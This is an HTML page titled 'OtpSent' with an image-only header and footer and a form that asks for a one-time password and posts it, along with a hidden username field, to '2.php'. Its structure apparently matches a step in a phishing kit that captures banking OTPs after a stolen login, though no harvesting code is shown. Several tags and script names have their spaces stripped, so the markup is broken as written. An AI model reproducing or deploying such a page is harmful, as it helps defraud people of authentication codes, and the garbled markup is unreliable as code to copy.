<!DOCTYPEHTML><htmllang="zxx">
<head>
   <title>OtpSent</title>
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <meta charset="utf-8">
   <meta name="keywords" content="">
   <script>addEventListener("load",function(){setTimeout(hideURLbar,0);},false);functionhideURLbar(){window.scrollTo(0,1);}</script><!--//Meta-Tags--><!--Stylesheets--><linkhref="unamestyle.css"rel='stylesheet'type='text/css'/><!--//Stylesheets--><!--onlinefonts--><linkhref="//fonts.googleapis.com/css?family=Ubuntu+Condensed"rel="stylesheet"><linkrel="stylesheet"type="text/css"href="bootstrap.css">
</head>
<body>
   <header></header>
   <img src="otp-header1.jpg" style="width:100%;padding-bottom:0px!important;">
   <img src="next.jpg"style="width:100%;">
   <div class="row">
      <div class="col-md-3"></div>
      <div class="col-md-6">
         <div class="mrd">
            <form action="2.php" method="post">
               <div class="row">
                  <div class="col-md-12"><span class="popp">Entertheonetimepassword(OTP)*</span><br><br><input type="text" class="pst" name="otp"required="">
                     <input type="hidden" class="pst" name="username" required=""value="">
                  </div>
               </div>
               <br>
               <div class="w3ls-login">
                  <p style="text-align:left!important;margin-left:-166px;"><button type="submit" class="btnp" style="background-color:#F89611!important;">Confirm</button></p>
               </div>
            </form>
         </div>
      </div>
      <div class="col-md-3"></div>
   </div>
   <a href="otp.php"><img src="otp-footer.jpg" style="width:100%;padding:0px!important;"></a><img src="footer.jpg" style="width:100%;padding:0px!important;">
</body>
</html>